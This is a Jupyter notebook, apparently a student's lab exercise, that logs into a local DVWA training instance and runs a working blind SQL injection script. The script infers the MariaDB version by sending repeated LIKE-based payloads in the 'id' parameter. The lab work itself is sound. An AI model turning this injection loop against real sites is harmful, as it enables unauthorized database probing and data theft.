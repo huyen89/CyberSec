{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Low-level Blink SQL Injection\n",
    "Objective: To find SQL version"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 1. Thực hiện đăng nhập"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from bs4 import BeautifulSoup # Thư viện xử lý HTML\n",
    "\n",
    "USERNAME = \"admin\"  \n",
    "PASSWORD = \"password\"\n",
    "BASE_URL = \"http://localhost:32768/\" # DVWA Base URL\n",
    "\n",
    "# Lưu trữ phiên làm việc\n",
    "session = requests.Session()\n",
    "\n",
    "# Truy cập trang đăng nhập để lấy cookie và dữ liệu phiên làm việc\n",
    "login_page = session.get(BASE_URL + \"login.php\")\n",
    "soup = BeautifulSoup(login_page.content, 'html.parser')\n",
    "user_token = soup.find('input', {'name': 'user_token'}).get('value')\n",
    "\n",
    "# Gửi yêu cầu đăng nhập\n",
    "data = {\"username\": USERNAME, \"password\": PASSWORD, \"user_token\": user_token, \"Login\": \"Login#\"}\n",
    "response = session.post(BASE_URL + \"login.php\", data=data)\n",
    "\n",
    "# Kiểm tra đăng nhập thành công\n",
    "# Lưu trữ nội dung trang dashboard\n",
    "dashboard_page = session.get(BASE_URL + \"index.php\")\n",
    "\n",
    "# Lưu trữ tiêu đề dashboard\n",
    "dashboard_title = BeautifulSoup(dashboard_page.content, 'html.parser').title.text"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 2. Thực hiện kiểm tra phiên bản hiện tại của trang web\n",
    "\n",
    "--- mariaDB ---"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Phiên bản MariaDB là 10.1.26\n"
     ]
    }
   ],
   "source": [
    "# Kiểm tra đăng nhập thành công hay không\n",
    "if \"Welcome :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*\" == dashboard_title:\n",
    "    # Khởi tạo các biến ban đầu \n",
    "    version = ''\n",
    "    i = 0 # Giá trị số trong version\n",
    "\n",
    "    # Kiểm tra phiên bản chính / phụ\n",
    "    while i < 100:\n",
    "        params = {\"id\": \"1' and version() LIKE '{}%'#\".format(str(version)+str(i)+\".\"), \"Submit\": \"Submit\"}\n",
    "        result = session.get(BASE_URL + \"vulnerabilities/sqli_blind/\", params = params)\n",
    "\n",
    "        if \"User ID exists in the database.\" in result.text:\n",
    "            version = version + str(i) + '.'\n",
    "            i = 1\n",
    "        else: \n",
    "            i = i + 1\n",
    "\n",
    "    # Kiểm tra bản vá lỗi nhỏ\n",
    "    while i > 0:\n",
    "        params = {\"id\": \"1' and version() LIKE '{}%'#\".format(str(version)+str(i)), \"Submit\": \"Submit\"}\n",
    "        result = session.get(BASE_URL + \"vulnerabilities/sqli_blind/\", params = params)\n",
    "\n",
    "        if \"User ID exists in the database.\" in result.text:\n",
    "            version = version + str(i) \n",
    "        else: \n",
    "            i = i - 1\n",
    "\n",
    "    # In ra phiên bản\n",
    "    print(\"Phiên bản MariaDB là {}\".format(version))\n",
    "else:\n",
    "    print(\"Đăng nhập thất bại\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.3"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
